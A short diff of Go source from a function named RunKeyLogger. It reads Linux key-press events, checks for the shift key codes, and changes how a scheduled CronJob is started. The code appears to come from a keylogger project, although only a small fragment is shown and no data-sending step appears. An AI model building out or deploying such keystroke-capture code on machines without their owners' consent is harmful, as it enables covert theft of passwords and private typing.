@@ -21,12 +21,8 @@ func RunKeyLogger() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	go func() {
-		for {
-			CronJob(conf.GetString("cron_duration"))
-		}
-	}()
-	for ie := range ret {
+	CronJob(conf.GetString("cron_duration"))
+	for ie := range chie {
 		if ie.Type == EV_KEY {
 			if ie.Value == 1 {
 				if ie.Code == 42 || ie.Code == 54 {
